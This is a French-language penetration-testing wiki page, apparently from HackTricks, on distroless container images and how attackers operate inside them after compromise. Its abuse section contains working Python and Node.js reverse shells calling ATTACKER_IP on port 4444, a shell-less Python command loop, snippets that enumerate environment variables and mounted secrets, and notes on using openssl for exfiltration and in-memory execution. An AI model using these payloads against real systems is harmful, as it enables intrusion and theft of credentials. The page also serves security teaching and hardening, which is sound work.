# Conteneurs Distroless

{{#include ../../../banners/hacktricks-training.md}}

## Aperçu

Une image de conteneur **distroless** est une image qui fournit les **composants runtime minimaux nécessaires pour exécuter une application spécifique**, tout en supprimant volontairement les outils habituels de distribution tels que les gestionnaires de paquets, les shells et de larges ensembles d'utilitaires userland génériques. En pratique, les images distroless contiennent souvent uniquement le binaire ou le runtime de l'application, ses bibliothèques partagées, des bundles de certificats et une structure de système de fichiers très réduite.

L'idée n'est pas que distroless soit un nouveau primitif d'isolation du noyau. Distroless est une **stratégie de conception d'image**. Elle change ce qui est disponible **à l'intérieur** du système de fichiers du conteneur, pas la façon dont le noyau isole le conteneur. Cette distinction est importante, car distroless durcit l'environnement principalement en réduisant ce qu'un attaquant peut utiliser après avoir obtenu l'exécution de code. Cela ne remplace pas les namespaces, seccomp, capabilities, AppArmor, SELinux, ou tout autre mécanisme d'isolation à l'exécution.

## Pourquoi Distroless existe

Les images distroless sont principalement utilisées pour réduire :

- la taille de l'image
- la complexité opérationnelle de l'image
- le nombre de paquets et binaires susceptibles de contenir des vulnérabilités
- le nombre d'outils de post-exploitation disponibles pour un attaquant par défaut

C'est pourquoi les images distroless sont populaires dans les déploiements d'applications en production. Un conteneur sans shell, sans gestionnaire de paquets et presque sans outillage générique est généralement plus simple à maîtriser opérationnellement et plus difficile à abuser de manière interactive après compromission.

Des exemples de familles d'images de type distroless bien connues incluent :

- Google's distroless images
- Chainguard hardened/minimal images

## Ce que Distroless ne signifie pas

Un conteneur distroless n'est **pas** :

- automatiquement rootless
- automatiquement non-privileged
- automatiquement en lecture seule
- automatiquement protégé par seccomp, AppArmor, ou SELinux
- automatiquement sûr contre une container escape

Il est toujours possible d'exécuter une image distroless avec `--privileged`, en partageant des namespaces host, des bind mounts dangereux, ou un socket runtime monté. Dans ce scénario, l'image peut être minimale, mais le conteneur peut rester catastrophiquement insecure. Distroless modifie la surface d'attaque userland, pas la frontière de confiance du noyau.

## Caractéristiques opérationnelles typiques

Lorsque vous compromettez un conteneur distroless, la première chose que vous remarquez généralement est que des hypothèses courantes cessent d'être vraies. Il se peut qu'il n'y ait pas de `sh`, pas de `bash`, pas de `ls`, pas de `id`, pas de `cat`, et parfois même pas d'environnement basé sur libc qui se comporte comme vos tradecrafts habituels l'attendent. Cela affecte à la fois l'offense et la défense, car le manque d'outils rend le debugging, l'analyse d'incident et la post-exploitation différents.

Les schémas les plus courants sont :

- le runtime de l'application est présent, mais peu d'autre chose
- les payloads basés sur shell échouent parce qu'il n'y a pas de shell
- les one-liners d'énumération classiques échouent parce que les binaires d'aide sont absents
- des protections du système de fichiers telles que rootfs en lecture seule ou `noexec` sur des emplacements tmpfs inscriptibles sont souvent présentes également

C'est cette combinaison qui pousse souvent les gens à parler de "weaponizing distroless".

## Distroless et post-exploitation

Le principal défi offensif dans un environnement distroless n'est pas toujours la RCE initiale. Il s'agit souvent de ce qui vient ensuite. Si la charge exploitée donne l'exécution de code dans un runtime de langage tel que Python, Node.js, Java ou Go, vous pouvez être capable d'exécuter une logique arbitraire, mais pas via les workflows centrés sur le shell qui sont courants sur d'autres cibles Linux.

Cela signifie que la post-exploitation s'oriente souvent vers l'une des trois voies suivantes :

1. **Utiliser directement le runtime du langage existant** pour énumérer l'environnement, ouvrir des sockets, lire des fichiers ou charger des payloads supplémentaires.
2. **Apporter vos propres outils en mémoire** si le système de fichiers est en lecture seule ou si des emplacements inscriptibles sont montés `noexec`.
3. **Abuser des binaires existants déjà présents dans l'image** si l'application ou ses dépendances incluent quelque chose d'inattendu et utile.

## Abus

### Énumérer le runtime déjà présent

Dans de nombreux conteneurs distroless il n'y a pas de shell, mais il existe toujours un runtime applicatif. Si la cible est un service Python, Python est présent. Si la cible est Node.js, Node est présent. Cela fournit souvent suffisamment de fonctionnalités pour énumérer des fichiers, lire des variables d'environnement, ouvrir des reverse shells et préparer une exécution en mémoire sans jamais invoquer `/bin/sh`.

Un exemple simple en Python :
```bash
python3 - <<'PY'
import os, socket, subprocess
print("uid", os.getuid())
print("cwd", os.getcwd())
print("env keys", list(os.environ)[:20])
print("root files", os.listdir("/")[:30])
PY
```
Un exemple simple avec Node.js :
```bash
node -e 'const fs=require("fs"); console.log(process.getuid && process.getuid()); console.log(fs.readdirSync("/").slice(0,30)); console.log(Object.keys(process.env).slice(0,20));'
```
Impact :

- récupération des variables d'environnement, souvent incluant des identifiants ou des endpoints de service
- énumération du système de fichiers sans `/bin/ls`
- identification des chemins en écriture et des secrets montés

### Reverse Shell sans `/bin/sh`

Si l'image ne contient pas `sh` ou `bash`, un reverse shell classique basé sur un shell peut échouer immédiatement. Dans ce cas, utilisez plutôt le runtime du langage installé.

Python reverse shell:
```bash
python3 - <<'PY'
import os,pty,socket
s=socket.socket()
s.connect(("ATTACKER_IP",4444))
for fd in (0,1,2):
os.dup2(s.fileno(),fd)
pty.spawn("/bin/sh")
PY
```
Si `/bin/sh` n'existe pas, remplacez la dernière ligne par une exécution de commande directe pilotée par Python ou une boucle REPL Python.

Node reverse shell:
```bash
node -e 'var net=require("net"),cp=require("child_process");var s=net.connect(4444,"ATTACKER_IP",function(){var p=cp.spawn("/bin/sh",[]);s.pipe(p.stdin);p.stdout.pipe(s);p.stderr.pipe(s);});'
```
Encore une fois, si `/bin/sh` est absent, utilisez directement les API filesystem, process et networking de Node au lieu de lancer un shell.

### Exemple complet : No-Shell Python Command Loop

Si l'image contient Python mais aucun shell, une simple boucle interactive suffit souvent pour maintenir une pleine capacité de post-exploitation :
```bash
python3 - <<'PY'
import os,subprocess
while True:
cmd=input("py> ")
if cmd.strip() in ("exit","quit"):
break
p=subprocess.run(cmd, shell=True, capture_output=True, text=True)
print(p.stdout, end="")
print(p.stderr, end="")
PY
```
Cela ne nécessite pas de binaire de shell interactif. L'impact est essentiellement le même que pour un shell basique du point de vue de l'attaquant : exécution de commandes, énumération et préparation (staging) de charges utiles supplémentaires via le runtime existant.

### Exécution d'outils en mémoire

Les images distroless sont souvent combinées avec :

- `readOnlyRootFilesystem: true`
- un tmpfs inscriptible mais `noexec` tel que `/dev/shm`
- une absence d'outils de gestion de paquets

Cette combinaison rend peu fiables les flux classiques « télécharger un binaire sur le disque et l'exécuter ». Dans ces cas, les techniques d'exécution en mémoire deviennent la principale réponse.

The dedicated page for that is:

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Les techniques les plus pertinentes y sont :

- `memfd_create` + `execve` via des runtimes de scripting
- DDexec / EverythingExec
- memexec
- memdlopen

### Binaires déjà présents dans l'image

Certaines images distroless contiennent encore des binaires nécessaires au fonctionnement qui deviennent utiles après compromission. Un exemple fréquemment observé est `openssl`, car des applications en ont parfois besoin pour des tâches liées à la crypto ou au TLS.

Un modèle de recherche rapide est :
```bash
find / -type f \( -name openssl -o -name busybox -o -name wget -o -name curl \) 2>/dev/null
```
Si `openssl` est présent, il peut être utilisé pour :

- outbound TLS connections
- data exfiltration over an allowed egress channel
- staging payload data through encoded/encrypted blobs

L'abus exact dépend de ce qui est réellement installé, mais l'idée générale est que distroless ne signifie pas "aucun outil du tout" ; cela signifie "beaucoup moins d'outils qu'une image de distribution normale".

## Vérifications

Le but de ces vérifications est de déterminer si l'image est réellement distroless en pratique et quels runtime ou helper binaries sont encore disponibles pour la post-exploitation.
```bash
find / -maxdepth 2 -type f 2>/dev/null | head -n 100          # Very small rootfs is common in distroless images
which sh bash ash busybox python python3 node java 2>/dev/null   # Identify which runtime or shell primitives exist
cat /etc/os-release 2>/dev/null                                # Often missing or minimal
mount | grep -E ' /( |$)|/dev/shm'                             # Check for read-only rootfs and writable tmpfs
```
Ce qui est intéressant ici :

- Si aucun shell n'est disponible mais qu'un runtime tel que Python ou Node est présent, post-exploitation devrait pivoter vers runtime-driven execution.
- Si le système de fichiers racine est en lecture seule et que `/dev/shm` est inscriptible mais monté avec `noexec`, memory execution techniques deviennent beaucoup plus pertinentes.
- Si des binaires d'assistance tels que `openssl`, `busybox`, ou `java` existent, ils peuvent offrir suffisamment de fonctionnalités pour obtenir un accès supplémentaire.

## Runtime Defaults

| Image / platform style | Default state | Typical behavior | Common manual weakening |
| --- | --- | --- | --- |
| Google distroless style images | Minimal userland by design | No shell, no package manager, only application/runtime dependencies | adding debugging layers, sidecar shells, copying in busybox or tooling |
| Chainguard minimal images | Minimal userland by design | Reduced package surface, often focused on one runtime or service | using `:latest-dev` or debug variants, copying tools during build |
| Kubernetes workloads using distroless images | Depends on Pod config | Distroless affects userland only; Pod security posture still depends on the Pod spec and runtime defaults | adding ephemeral debug containers, host mounts, privileged Pod settings |
| Docker / Podman running distroless images | Depends on run flags | Minimal filesystem, but runtime security still depends on flags and daemon configuration | `--privileged`, host namespace sharing, runtime socket mounts, writable host binds |

Le point clé est que distroless est une **image property**, pas une runtime protection. Sa valeur vient de la réduction de ce qui est disponible à l'intérieur du système de fichiers après une compromission.

## Related Pages

Pour les bypasses de filesystem et memory-execution couramment nécessaires dans les environnements distroless :

{{#ref}}
../../bypass-bash-restrictions/bypass-fs-protections-read-only-no-exec-distroless/
{{#endref}}

Pour l'abus du container runtime, des sockets et des mounts qui s'applique toujours aux workloads distroless :

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}
